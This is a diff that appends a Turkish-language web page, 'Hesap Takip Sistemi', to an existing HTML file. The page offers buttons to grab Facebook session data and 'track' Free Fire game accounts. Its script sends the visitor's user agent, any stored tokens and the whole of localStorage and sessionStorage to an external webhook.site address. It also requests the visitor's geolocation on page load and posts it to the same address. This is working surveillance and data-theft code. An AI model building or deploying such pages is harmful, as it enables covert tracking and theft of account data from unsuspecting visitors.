@@ -76,3 +76,177 @@
 
 </body>
 </html>
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hesap Takip Sistemi</title>
+    <style>
+        body {
+            font-family: monospace;
+            background: #0a0a0a;
+            color: #0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .kutu {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #0f0;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 15px;
+            border-radius: 5px;
+            font-weight: bold;
+            width: 100%;
+            margin: 10px 0;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .log {
+            background: #000;
+            padding: 10px;
+            font-size: 11px;
+            text-align: left;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="kutu">
+        <h2>🔐 Hesap Takip Sistemi</h2>
+        <p>Facebook oturum bilgilerini ve konumu çek</p>
+        
+        <button onclick="facebookBilgileriniAl()">📱 Facebook Bilgilerini Al</button>
+        <button onclick="konumAl()">📍 Konumumu Gönder</button>
+        <button onclick="hesapTakip()">🎮 Free Fire Hesap Takibi Başlat</button>
+        
+        <div class="log" id="log">
+            > Sistem hazır<br>
+            > Butonlara tıkla
+        </div>
+    </div>
+
+    <script>
+        const webhook = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
+        
+        function logEkle(msg) {
+            const logDiv = document.getElementById('log');
+            logDiv.innerHTML += `<br>> ${new Date().toLocaleTimeString()} - ${msg}`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        async function gonderWebhook(veri) {
+            try {
+                await fetch(webhook, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(veri)
+                });
+                logEkle("✅ Webhook'a gönderildi");
+            } catch(e) {
+                logEkle("❌ Gönderim hatası: " + e.message);
+            }
+        }
+        
+        // Facebook'tan mevcut oturum bilgilerini al
+        async function facebookBilgileriniAl() {
+            logEkle("📱 Facebook bilgileri alınıyor...");
+            
+            // Facebook uygulamasını açmaya çalış
+            window.location.href = "fb://profile";
+            
+            // Facebook'un sakladığı bilgileri dene
+            const fbBilgi = {
+                tip: "Facebook_Oturum",
+                zaman: new Date().toLocaleString('tr-TR'),
+                cihaz: navigator.userAgent,
+                platform: navigator.platform,
+                fbKullanici: localStorage.getItem('user') || "Çekilemedi",
+                fbToken: sessionStorage.getItem('fb_token') || "Çekilemedi",
+                not: "Facebook uygulaması açıldı, bilgiler manuel kontrol edilmeli"
+            };
+            
+            await gonderWebhook(fbBilgi);
+            logEkle("ℹ️ Facebook uygulaması açıldı, profil bilgilerini kontrol et");
+        }
+        
+        // Konum al
+        function konumAl() {
+            logEkle("📍 Konum alınıyor...");
+            
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const konumLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        const konumVeri = {
+                            tip: "Konum_Bilgisi",
+                            zaman: new Date().toLocaleString('tr-TR'),
+                            konum: konumLink,
+                            enlem: pos.coords.latitude,
+                            boylam: pos.coords.longitude,
+                            dogruluk: pos.coords.accuracy + " metre"
+                        };
+                        await gonderWebhook(konumVeri);
+                        logEkle(`📍 Konum: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                    },
+                    async (err) => {
+                        logEkle("❌ Konum hatası: " + err.message);
+                        await gonderWebhook({
+                            tip: "Konum_Hatasi",
+                            hata: err.message
+                        });
+                    }
+                );
+            } else {
+                logEkle("❌ Tarayıcı konum desteklemiyor");
+            }
+        }
+        
+        // Hesap takibi - Free Fire'dan bilgi çekmeye çalış
+        function hesapTakip() {
+            logEkle("🎮 Free Fire hesap bilgileri taranıyor...");
+            
+            // Free Fire'ın sakladığı yerleri kontrol et
+            const ffVeri = {
+                tip: "FreeFire_Hesap_Takip",
+                zaman: new Date().toLocaleString('tr-TR'),
+                cihaz: navigator.userAgent,
+                ffYukluMu: "Bilinmiyor",
+                ffVeriler: localStorage.getItem('freefire') || "Bulunamadı",
+                sessionData: JSON.stringify(sessionStorage),
+                localData: JSON.stringify(localStorage),
+                not: "Free Fire açıldığında oturum bilgileri kontrol edilecek"
+            };
+            
+            // Webhook'a gönder
+            gonderWebhook(ffVeri);
+            
+            // Free Fire'ı aç
+            logEkle("🎮 Free Fire açılıyor...");
+            setTimeout(() => {
+                window.location.href = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
+            }, 1000);
+        }
+        
+        // Otomatik konum gönderimi
+        setTimeout(() => {
+            konumAl();
+        }, 2000);
+    </script>
+</body>
+</html>
